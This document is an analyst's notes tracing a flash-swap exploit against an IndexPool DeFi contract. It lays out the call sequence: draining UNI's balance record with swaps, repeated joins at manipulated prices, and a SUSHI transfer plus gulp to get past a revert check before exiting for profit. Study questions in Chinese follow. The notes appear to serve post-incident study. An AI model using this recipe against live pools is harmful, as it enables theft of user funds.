Note: IndexPool's Underlying token list = [UNI, AAVE, COMP, SNX, CRV, MKR, SNX, <Sushi: empty>]

Sushi.swap(UNI, AAVE, COMP, SNX, CRV, MKR, SNX) // flash swap in sushi
    -> IndexPool.extrapolatePoolValueFromToken  // find first initialized token (uni), calc it extrapolated
    -> IndexPool.swapExactAmountIn => UNI   // swap AAVE, COMP ... to UNI one by one ([IN]such as CRV: 3210906891991096095551982). it decreases record[uni].balance
    -> IndexPool.extrapolatePoolValueFromToken  // now uni's extrapolated value is lower
    -> IndexPool.joinswapExternAmountIn(uni, half amount) xN   // PoolShare amountout rely on the record[uni].balance, which has been manipulated.
    -> Sushi.swap(sushi) //  flash swap in sushi
        -> sushi.transfer(IndexPool,) 
        // transfer some sushi to IndexPool (before that: record[sushi].balance = 0)
        // otherwise it will revert in exitpool (line 485: require(tokenAmountOut != 0, "ERR_MATH_APPROX");)
        -> IndexPool.gulp(sushi)    // update record[sushi].balance
        -> IndexPool.exitPool   // exit pool to obtain profits (by uni), [OUT]such as CRV: 3549411530679908933793216 (profit: 338504638688812838241234)
        -> IndexPool.joinswapExternAmountIn(sushi, half amount) x6 // use sushi to exploit (the same way as uni)
        -> IndexPool.exitPool
        -> IndexPool.joinswapExternAmountIn(sushi, half amount) x5
        -> IndexPool.exitPool
        -> repay all flashloan

Step 1: drain record[uni].balance by swapExactAmountIn
Step 2: repeatly join pool through uni (in this step, attacker can obtain profit, because of the manipulation of uni balance)
step 3: enable sushi (transfer some sushi to indexpool), otherwise the function exitpool will revert (record[sushi].balance = 0) 
step 4: exit pool to get profits (attacker can withdraw more underlying token than he spent (to buy uni), such as CRV[IN]=3210906891991096095551982, CRV[OUT]=3549411530679908933793216)
step 5: repeat step 2 (by sushi) & step 4, to get profits by sushi


Q1: 为什么需要多次swapExactAmountIn，每次取IndexPool相应Token的Balance的一半
Q2: 为什么需要多次joinswapExternAmountIn, 每次取IndexPool Uni/Sushi Balance的一半
Q3: 为什么需要转这么多Sushi给IndexPool
line 485 (indexPool):         
    uint256 tokenAmountOut = bmul(ratio, record.balance);
    require(tokenAmountOut != 0, "ERR_MATH_APPROX");
Q4: 为什么Sushi分两次Join + exit
